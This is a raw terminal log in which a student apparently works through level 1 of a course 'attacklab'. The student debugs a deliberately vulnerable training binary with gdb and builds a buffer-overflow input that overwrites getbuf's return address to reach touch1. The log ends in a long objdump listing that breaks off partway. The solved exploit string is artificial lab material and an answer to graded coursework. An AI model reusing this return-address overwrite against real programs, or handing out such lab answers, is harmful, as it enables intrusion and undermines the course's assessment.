s-164-67-99-71:~ hermmy$ ssh huimin@lnxsrv09.seas.ucla.edu
huimin@lnxsrv09.seas.ucla.edu's password: 
Last login: Fri May 11 22:10:49 2018 from s-169-232-239-72.resnet.ucla.edu
*****************************************************************************
                        lnxsrv09.seas.ucla.edu RHEL 7
*****************************************************************************

        RedHat 7 -- may not behave the same as other lnxsrv
        Will be used by CS 32, CS 35L, CS 111, and CS 131

*****************************************************************************
*****************************************************************************
* ========================================================================= *
* SEASnet Computing Access                                                  *
*                                                                           *
* Priority is given both on the servers and in the student labs to those    *
* students doing coursework. Computing support for research is provided by  *
* each department.                                                          *
*****************************************************************************
* For assistance please contact help@seas.ucla.edu or call 206-6864.        *
*****************************************************************************
[huimin@lnxsrv09 ~]$ cd target17/
[huimin@lnxsrv09 ~/target17]$ gdb ctarget 
GNU gdb (GDB) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ctarget...done.
(gdb) disas test
Dump of assembler code for function test:
   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
   0x00000000004019c6 <+4>:	mov    $0x0,%eax
   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
   0x00000000004019d0 <+14>:	mov    %eax,%esi
   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
   0x00000000004019d7 <+21>:	mov    $0x0,%eax
   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
   0x00000000004019e1 <+31>:	add    $0x8,%rsp
   0x00000000004019e5 <+35>:	retq   
End of assembler dump.
(gdb) run < ans.txt
Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
Cookie: 0x76ebdb56
Type string:No exploit.  Getbuf returned 0x1
Normal return
[Inferior 1 (process 25575) exited normally]
(gdb) break *0x00000000004019d2
Breakpoint 1 at 0x4019d2: file visible.c, line 93.
(gdb) run < ans.txt
Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
Cookie: 0x76ebdb56

Breakpoint 1, 0x00000000004019d2 in test () at visible.c:93
93	visible.c: No such file or directory.
(gdb) x/64bx $edi
0x0:	Cannot access memory at address 0x0
(gdb) stepi
0x00000000004019d7	93	in visible.c
(gdb) x/64bx $edi
0x4030b8:	0x4e	0x6f	0x20	0x65	0x78	0x70	0x6c	0x6f
0x4030c0:	0x69	0x74	0x2e	0x20	0x20	0x47	0x65	0x74
0x4030c8:	0x62	0x75	0x66	0x20	0x72	0x65	0x74	0x75
0x4030d0:	0x72	0x6e	0x65	0x64	0x20	0x30	0x78	0x25
0x4030d8:	0x78	0x0a	0x00	0x0a	0x46	0x41	0x49	0x4c
0x4030e0:	0x09	0x25	0x63	0x74	0x61	0x72	0x67	0x65
0x4030e8:	0x74	0x09	0x25	0x64	0x09	0x25	0x73	0x0a
0x4030f0:	0x00	0x50	0x41	0x53	0x53	0x00	0x46	0x41
(gdb) stepi
0x00000000004019dc	93	in visible.c
(gdb) x/64bx $edi
0x4030b8:	0x4e	0x6f	0x20	0x65	0x78	0x70	0x6c	0x6f
0x4030c0:	0x69	0x74	0x2e	0x20	0x20	0x47	0x65	0x74
0x4030c8:	0x62	0x75	0x66	0x20	0x72	0x65	0x74	0x75
0x4030d0:	0x72	0x6e	0x65	0x64	0x20	0x30	0x78	0x25
0x4030d8:	0x78	0x0a	0x00	0x0a	0x46	0x41	0x49	0x4c
0x4030e0:	0x09	0x25	0x63	0x74	0x61	0x72	0x67	0x65
0x4030e8:	0x74	0x09	0x25	0x64	0x09	0x25	0x73	0x0a
0x4030f0:	0x00	0x50	0x41	0x53	0x53	0x00	0x46	0x41
(gdb) print $edi
$1 = 4206776
(gdb) print/x $edi
$2 = 0x4030b8
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x0000000000401848 <+0>:	sub    $0x38,%rsp
   0x000000000040184c <+4>:	mov    %rsp,%rdi
   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
   0x0000000000401854 <+12>:	mov    $0x1,%eax
   0x0000000000401859 <+17>:	add    $0x38,%rsp
   0x000000000040185d <+21>:	retq   
End of assembler dump.
(gdb) break *0x000000000040184f
Breakpoint 2 at 0x40184f: file buf.c, line 14.
(gdb) run < ans.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
Cookie: 0x76ebdb56

Breakpoint 2, 0x000000000040184f in getbuf () at buf.c:14
14	buf.c: No such file or directory.
(gdb) x/64bx $rsp
0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5561a0b8:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
0x5561a0c0:	0xd0	0x19	0x40	0x00	0x00	0x00	0x00	0x00
(gdb) disas 0x55586000
No function contains specified address.
(gdb) disas 0x4019d0
Dump of assembler code for function test:
   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
   0x00000000004019c6 <+4>:	mov    $0x0,%eax
   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
   0x00000000004019d0 <+14>:	mov    %eax,%esi
   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
   0x00000000004019d7 <+21>:	mov    $0x0,%eax
   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
   0x00000000004019e1 <+31>:	add    $0x8,%rsp
   0x00000000004019e5 <+35>:	retq   
End of assembler dump.
(gdb) quit
A debugging session is active.

	Inferior 1 [process 26936] will be killed.

Quit anyway? (y or n) y
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt 
[huimin@lnxsrv09 ~/target17]$ ls
ans.txt  cookie.txt  ctarget  farm.c  hex2raw  README.txt  rtarget
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt 
[huimin@lnxsrv09 ~/target17]$ gdb ctar
GNU gdb (GDB) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
ctar: No such file or directory.
(gdb) quit
[huimin@lnxsrv09 ~/target17]$ gdb ctarget 
GNU gdb (GDB) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ctarget...done.
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x0000000000401848 <+0>:	sub    $0x38,%rsp
   0x000000000040184c <+4>:	mov    %rsp,%rdi
   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
   0x0000000000401854 <+12>:	mov    $0x1,%eax
   0x0000000000401859 <+17>:	add    $0x38,%rsp
   0x000000000040185d <+21>:	retq   
End of assembler dump.
(gdb) break * 0x0000000000401859
Breakpoint 1 at 0x401859: file buf.c, line 16.
(gdb) run < ans.txt
Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
Cookie: 0x76ebdb56

Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
16	buf.c: No such file or directory.
(gdb) run < ans.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
Cookie: 0x76ebdb56

Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
16	in buf.c
(gdb) x/64bx $rsp
0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a0b8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
0x5561a0c0:	0x31	0x32	0x33	0x34	0x35	0x00	0x00	0x00
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x000000000040185e <+0>:	sub    $0x8,%rsp
   0x0000000000401862 <+4>:	movl   $0x1,0x202c90(%rip)        # 0x6044fc <vlevel>
   0x000000000040186c <+14>:	mov    $0x402ff2,%edi
   0x0000000000401871 <+19>:	callq  0x400c50 <puts@plt>
   0x0000000000401876 <+24>:	mov    $0x1,%edi
   0x000000000040187b <+29>:	callq  0x401c79 <validate>
   0x0000000000401880 <+34>:	mov    $0x0,%edi
   0x0000000000401885 <+39>:	callq  0x400df0 <exit@plt>
End of assembler dump.
(gdb) quit
A debugging session is active.

	Inferior 1 [process 35112] will be killed.

Quit anyway? (y or n) y
[huimin@lnxsrv09 ~/target17]$ ls
ans.txt  ans.txt~  cookie.txt  ctarget  farm.c  hex2raw  README.txt  rtarget
[huimin@lnxsrv09 ~/target17]$ ./hex2raw <40155e
-bash: 40155e: No such file or directory
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < "40185e"
-bash: 40185e: No such file or directory
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
Invalid hex value [0000000000000000000000000000000000000000000000000000000012345]. Please specify only single byte hex values separated by whitespace.
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
^@
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
^@
[huimin@lnxsrv09 ~/target17]$ printf "5e 18 40" | ./hex2raw
^@
[huimin@lnxsrv09 ~/target17]$ printf "5e 18 40" | ./hex2raw > ans.txt
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ ./hex2raw
5e 18 4-Invalid hex value [4-]. Please specify only single byte hex values separated by whitespace.
[huimin@lnxsrv09 ~/target17]$ ./hex2raw
5e 18 40^@
[huimin@lnxsrv09 ~/target17]$ ./hex2raw
5e
^
[huimin@lnxsrv09 ~/target17]$ printf "5e " | ./hex2raw 
^
[huimin@lnxsrv09 ~/target17]$ printf "31 " | ./hex2raw 
1
[huimin@lnxsrv09 ~/target17]$ printf "32" | ./hex2raw 
2
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt

[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | od -ta
0000000 nul nul nul  nl
0000004
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | ./ctarget -q
Cookie: 0x76ebdb56
Type string:Oops!: You executed an illegal instruction
Better luck next time
FAIL: Would have posted the following:
	user id	704978214
	course	CS33-S16
	lab	attacklab
	result	17:FAIL:0xffffffff:ctarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5E 18 40 
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
^@
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | od -ta
0000000 nul nul nul nul nul nul nul nul nul nul nul nul nul nul nul nul
*
0000060 nul nul nul nul nul nul   ^ can   @  nl
0000072
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ print/x ans.txt
-bash: print/x: No such file or directory
[huimin@lnxsrv09 ~/target17]$ cat ans.txt | od -ta
0000000   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
*
0000060   0   0   0   0   0   0   0   0   ^   c   a   n   @  nl
0000076
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | ./ctarget -q
Cookie: 0x76ebdb56
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	704978214
	course	CS33-S16
	lab	attacklab
	result	17:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 5E 18 40 
[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | ./ctarget
Cookie: 0x76ebdb56
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
[huimin@lnxsrv09 ~/target17]$ emacs cookie.txt 
[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
[huimin@lnxsrv09 ~/target17]$ gdb ctarget 
GNU gdb (GDB) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ctarget...done.
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x000000000040188a <+0>:	sub    $0x8,%rsp
   0x000000000040188e <+4>:	mov    %edi,%esi
   0x0000000000401890 <+6>:	movl   $0x2,0x202c62(%rip)        # 0x6044fc <vlevel>
   0x000000000040189a <+16>:	cmp    0x202c64(%rip),%edi        # 0x604504 <cookie>
   0x00000000004018a0 <+22>:	jne    0x4018bd <touch2+51>
   0x00000000004018a2 <+24>:	mov    $0x403018,%edi
   0x00000000004018a7 <+29>:	mov    $0x0,%eax
   0x00000000004018ac <+34>:	callq  0x400c80 <printf@plt>
   0x00000000004018b1 <+39>:	mov    $0x2,%edi
   0x00000000004018b6 <+44>:	callq  0x401c79 <validate>
   0x00000000004018bb <+49>:	jmp    0x4018d6 <touch2+76>
   0x00000000004018bd <+51>:	mov    $0x403040,%edi
   0x00000000004018c2 <+56>:	mov    $0x0,%eax
   0x00000000004018c7 <+61>:	callq  0x400c80 <printf@plt>
   0x00000000004018cc <+66>:	mov    $0x2,%edi
   0x00000000004018d1 <+71>:	callq  0x401d2b <fail>
   0x00000000004018d6 <+76>:	mov    $0x0,%edi
   0x00000000004018db <+81>:	callq  0x400df0 <exit@plt>
End of assembler dump.
(gdb) disas test
Dump of assembler code for function test:
   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
   0x00000000004019c6 <+4>:	mov    $0x0,%eax
   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
   0x00000000004019d0 <+14>:	mov    %eax,%esi
   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
   0x00000000004019d7 <+21>:	mov    $0x0,%eax
   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
   0x00000000004019e1 <+31>:	add    $0x8,%rsp
   0x00000000004019e5 <+35>:	retq   
End of assembler dump.
(gdb) quit
[huimin@lnxsrv09 ~/target17]$ objdump -d ctarget

ctarget:     file format elf64-x86-64


Disassembly of section .init:

0000000000400bc8 <_init>:
  400bc8:	48 83 ec 08          	sub    $0x8,%rsp
  400bcc:	48 8b 05 25 34 20 00 	mov    0x203425(%rip),%rax        # 603ff8 <_DYNAMIC+0x1d0>
  400bd3:	48 85 c0             	test   %rax,%rax
  400bd6:	74 05                	je     400bdd <_init+0x15>
  400bd8:	e8 33 01 00 00       	callq  400d10 <__gmon_start__@plt>
  400bdd:	48 83 c4 08          	add    $0x8,%rsp
  400be1:	c3                   	retq   

Disassembly of section .plt:

0000000000400bf0 <strcasecmp@plt-0x10>:
  400bf0:	ff 35 12 34 20 00    	pushq  0x203412(%rip)        # 604008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400bf6:	ff 25 14 34 20 00    	jmpq   *0x203414(%rip)        # 604010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400bfc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400c00 <strcasecmp@plt>:
  400c00:	ff 25 12 34 20 00    	jmpq   *0x203412(%rip)        # 604018 <_GLOBAL_OFFSET_TABLE_+0x18>
  400c06:	68 00 00 00 00       	pushq  $0x0
  400c0b:	e9 e0 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c10 <__errno_location@plt>:
  400c10:	ff 25 0a 34 20 00    	jmpq   *0x20340a(%rip)        # 604020 <_GLOBAL_OFFSET_TABLE_+0x20>
  400c16:	68 01 00 00 00       	pushq  $0x1
  400c1b:	e9 d0 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c20 <srandom@plt>:
  400c20:	ff 25 02 34 20 00    	jmpq   *0x203402(%rip)        # 604028 <_GLOBAL_OFFSET_TABLE_+0x28>
  400c26:	68 02 00 00 00       	pushq  $0x2
  400c2b:	e9 c0 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c30 <strncmp@plt>:
  400c30:	ff 25 fa 33 20 00    	jmpq   *0x2033fa(%rip)        # 604030 <_GLOBAL_OFFSET_TABLE_+0x30>
  400c36:	68 03 00 00 00       	pushq  $0x3
  400c3b:	e9 b0 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c40 <strcpy@plt>:
  400c40:	ff 25 f2 33 20 00    	jmpq   *0x2033f2(%rip)        # 604038 <_GLOBAL_OFFSET_TABLE_+0x38>
  400c46:	68 04 00 00 00       	pushq  $0x4
  400c4b:	e9 a0 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c50 <puts@plt>:
  400c50:	ff 25 ea 33 20 00    	jmpq   *0x2033ea(%rip)        # 604040 <_GLOBAL_OFFSET_TABLE_+0x40>
  400c56:	68 05 00 00 00       	pushq  $0x5
  400c5b:	e9 90 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c60 <write@plt>:
  400c60:	ff 25 e2 33 20 00    	jmpq   *0x2033e2(%rip)        # 604048 <_GLOBAL_OFFSET_TABLE_+0x48>
  400c66:	68 06 00 00 00       	pushq  $0x6
  400c6b:	e9 80 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c70 <mmap@plt>:
  400c70:	ff 25 da 33 20 00    	jmpq   *0x2033da(%rip)        # 604050 <_GLOBAL_OFFSET_TABLE_+0x50>
  400c76:	68 07 00 00 00       	pushq  $0x7
  400c7b:	e9 70 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c80 <printf@plt>:
  400c80:	ff 25 d2 33 20 00    	jmpq   *0x2033d2(%rip)        # 604058 <_GLOBAL_OFFSET_TABLE_+0x58>
  400c86:	68 08 00 00 00       	pushq  $0x8
  400c8b:	e9 60 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400c90 <memset@plt>:
  400c90:	ff 25 ca 33 20 00    	jmpq   *0x2033ca(%rip)        # 604060 <_GLOBAL_OFFSET_TABLE_+0x60>
  400c96:	68 09 00 00 00       	pushq  $0x9
  400c9b:	e9 50 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400ca0 <alarm@plt>:
  400ca0:	ff 25 c2 33 20 00    	jmpq   *0x2033c2(%rip)        # 604068 <_GLOBAL_OFFSET_TABLE_+0x68>
  400ca6:	68 0a 00 00 00       	pushq  $0xa
  400cab:	e9 40 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400cb0 <close@plt>:
  400cb0:	ff 25 ba 33 20 00    	jmpq   *0x2033ba(%rip)        # 604070 <_GLOBAL_OFFSET_TABLE_+0x70>
  400cb6:	68 0b 00 00 00       	pushq  $0xb
  400cbb:	e9 30 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400cc0 <read@plt>:
  400cc0:	ff 25 b2 33 20 00    	jmpq   *0x2033b2(%rip)        # 604078 <_GLOBAL_OFFSET_TABLE_+0x78>
  400cc6:	68 0c 00 00 00       	pushq  $0xc
  400ccb:	e9 20 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400cd0 <__libc_start_main@plt>:
  400cd0:	ff 25 aa 33 20 00    	jmpq   *0x2033aa(%rip)        # 604080 <_GLOBAL_OFFSET_TABLE_+0x80>
  400cd6:	68 0d 00 00 00       	pushq  $0xd
  400cdb:	e9 10 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400ce0 <signal@plt>:
  400ce0:	ff 25 a2 33 20 00    	jmpq   *0x2033a2(%rip)        # 604088 <_GLOBAL_OFFSET_TABLE_+0x88>
  400ce6:	68 0e 00 00 00       	pushq  $0xe
  400ceb:	e9 00 ff ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400cf0 <gethostbyname@plt>:
  400cf0:	ff 25 9a 33 20 00    	jmpq   *0x20339a(%rip)        # 604090 <_GLOBAL_OFFSET_TABLE_+0x90>
  400cf6:	68 0f 00 00 00       	pushq  $0xf
  400cfb:	e9 f0 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d00 <fprintf@plt>:
  400d00:	ff 25 92 33 20 00    	jmpq   *0x203392(%rip)        # 604098 <_GLOBAL_OFFSET_TABLE_+0x98>
  400d06:	68 10 00 00 00       	pushq  $0x10
  400d0b:	e9 e0 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d10 <__gmon_start__@plt>:
  400d10:	ff 25 8a 33 20 00    	jmpq   *0x20338a(%rip)        # 6040a0 <_GLOBAL_OFFSET_TABLE_+0xa0>
  400d16:	68 11 00 00 00       	pushq  $0x11
  400d1b:	e9 d0 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d20 <strtol@plt>:
  400d20:	ff 25 82 33 20 00    	jmpq   *0x203382(%rip)        # 6040a8 <_GLOBAL_OFFSET_TABLE_+0xa8>
  400d26:	68 12 00 00 00       	pushq  $0x12
  400d2b:	e9 c0 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d30 <memcpy@plt>:
  400d30:	ff 25 7a 33 20 00    	jmpq   *0x20337a(%rip)        # 6040b0 <_GLOBAL_OFFSET_TABLE_+0xb0>
  400d36:	68 13 00 00 00       	pushq  $0x13
  400d3b:	e9 b0 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d40 <time@plt>:
  400d40:	ff 25 72 33 20 00    	jmpq   *0x203372(%rip)        # 6040b8 <_GLOBAL_OFFSET_TABLE_+0xb8>
  400d46:	68 14 00 00 00       	pushq  $0x14
  400d4b:	e9 a0 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d50 <random@plt>:
  400d50:	ff 25 6a 33 20 00    	jmpq   *0x20336a(%rip)        # 6040c0 <_GLOBAL_OFFSET_TABLE_+0xc0>
  400d56:	68 15 00 00 00       	pushq  $0x15
  400d5b:	e9 90 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d60 <_IO_getc@plt>:
  400d60:	ff 25 62 33 20 00    	jmpq   *0x203362(%rip)        # 6040c8 <_GLOBAL_OFFSET_TABLE_+0xc8>
  400d66:	68 16 00 00 00       	pushq  $0x16
  400d6b:	e9 80 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d70 <__isoc99_sscanf@plt>:
  400d70:	ff 25 5a 33 20 00    	jmpq   *0x20335a(%rip)        # 6040d0 <_GLOBAL_OFFSET_TABLE_+0xd0>
  400d76:	68 17 00 00 00       	pushq  $0x17
  400d7b:	e9 70 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d80 <munmap@plt>:
  400d80:	ff 25 52 33 20 00    	jmpq   *0x203352(%rip)        # 6040d8 <_GLOBAL_OFFSET_TABLE_+0xd8>
  400d86:	68 18 00 00 00       	pushq  $0x18
  400d8b:	e9 60 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400d90 <bcopy@plt>:
  400d90:	ff 25 4a 33 20 00    	jmpq   *0x20334a(%rip)        # 6040e0 <_GLOBAL_OFFSET_TABLE_+0xe0>
  400d96:	68 19 00 00 00       	pushq  $0x19
  400d9b:	e9 50 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400da0 <fopen@plt>:
  400da0:	ff 25 42 33 20 00    	jmpq   *0x203342(%rip)        # 6040e8 <_GLOBAL_OFFSET_TABLE_+0xe8>
  400da6:	68 1a 00 00 00       	pushq  $0x1a
  400dab:	e9 40 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400db0 <getopt@plt>:
  400db0:	ff 25 3a 33 20 00    	jmpq   *0x20333a(%rip)        # 6040f0 <_GLOBAL_OFFSET_TABLE_+0xf0>
  400db6:	68 1b 00 00 00       	pushq  $0x1b
  400dbb:	e9 30 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400dc0 <strtoul@plt>:
  400dc0:	ff 25 32 33 20 00    	jmpq   *0x203332(%rip)        # 6040f8 <_GLOBAL_OFFSET_TABLE_+0xf8>
  400dc6:	68 1c 00 00 00       	pushq  $0x1c
  400dcb:	e9 20 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400dd0 <gethostname@plt>:
  400dd0:	ff 25 2a 33 20 00    	jmpq   *0x20332a(%rip)        # 604100 <_GLOBAL_OFFSET_TABLE_+0x100>
  400dd6:	68 1d 00 00 00       	pushq  $0x1d
  400ddb:	e9 10 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400de0 <sprintf@plt>:
  400de0:	ff 25 22 33 20 00    	jmpq   *0x203322(%rip)        # 604108 <_GLOBAL_OFFSET_TABLE_+0x108>
  400de6:	68 1e 00 00 00       	pushq  $0x1e
  400deb:	e9 00 fe ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400df0 <exit@plt>:
  400df0:	ff 25 1a 33 20 00    	jmpq   *0x20331a(%rip)        # 604110 <_GLOBAL_OFFSET_TABLE_+0x110>
  400df6:	68 1f 00 00 00       	pushq  $0x1f
  400dfb:	e9 f0 fd ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400e00 <connect@plt>:
  400e00:	ff 25 12 33 20 00    	jmpq   *0x203312(%rip)        # 604118 <_GLOBAL_OFFSET_TABLE_+0x118>
  400e06:	68 20 00 00 00       	pushq  $0x20
  400e0b:	e9 e0 fd ff ff       	jmpq   400bf0 <_init+0x28>

0000000000400e10 <socket@plt>:
  400e10:	ff 25 0a 33 20 00    	jmpq   *0x20330a(%rip)        # 604120 <_GLOBAL_OFFSET_TABLE_+0x120>
  400e16:	68 21 00 00 00       	pushq  $0x21
  400e1b:	e9 d0 fd ff ff       	jmpq   400bf0 <_init+0x28>

Disassembly of section .text:

0000000000400e20 <_start>:
  400e20:	31 ed                	xor    %ebp,%ebp
  400e22:	49 89 d1             	mov    %rdx,%r9
  400e25:	5e                   	pop    %rsi
  400e26:	48 89 e2             	mov    %rsp,%rdx
  400e29:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  400e2d:	50                   	push   %rax
  400e2e:	54                   	push   %rsp
  400e2f:	49 c7 c0 80 2c 40 00 	mov    $0x402c80,%r8
  400e36:	48 c7 c1 10 2c 40 00 	mov    $0x402c10,%rcx
  400e3d:	48 c7 c7 e0 10 40 00 	mov    $0x4010e0,%rdi
  400e44:	e8 87 fe ff ff       	callq  400cd0 <__libc_start_main@plt>
  400e49:	f4                   	hlt    
  400e4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400e50 <deregister_tm_clones>:
  400e50:	b8 b7 44 60 00       	mov    $0x6044b7,%eax
  400e55:	55                   	push   %rbp
  400e56:	48 2d b0 44 60 00    	sub    $0x6044b0,%rax
  400e5c:	48 83 f8 0e          	cmp    $0xe,%rax
  400e60:	48 89 e5             	mov    %rsp,%rbp
  400e63:	77 02                	ja     400e67 <deregister_tm_clones+0x17>
  400e65:	5d                   	pop    %rbp
  400e66:	c3                   	retq   
  400e67:	b8 00 00 00 00       	mov    $0x0,%eax
  400e6c:	48 85 c0             	test   %rax,%rax
